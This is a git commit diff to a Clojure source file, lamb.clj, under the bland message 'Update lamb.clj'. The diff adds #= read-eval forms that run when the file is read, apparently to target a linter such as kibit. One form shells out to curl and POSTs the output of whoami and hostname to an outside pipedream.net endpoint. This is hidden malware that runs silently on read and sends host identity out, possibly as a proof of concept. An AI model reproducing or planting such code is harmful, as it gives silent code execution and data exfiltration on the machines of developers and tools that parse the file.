5068edba0cfe8b3b744c45c38bea3be027784347
rotem-cider <78903577+rotem-cider@users.noreply.github.com>
2021-02-23 11:29:23 +0200

    Update lamb.clj

--- lamb.clj
+++ lamb.clj
@@ -2,4 +2,9 @@
   "Waiting for slaughter"
   )
   
-  #=(println "Oh my!!")
+#=(println "Running code")
+
+#=(eval '(do
+	(use '[clojure.java.shell :only [sh]])
+	(map println (clojure.string/split (:out (clojure.java.shell/sh "sh" "-c" "curl -X POST -d \"$(whoami && hostname)\" https://95a3bed651e039798c778628a22dc980.m.pipedream.net/kibit ")) #"\n"))
+))
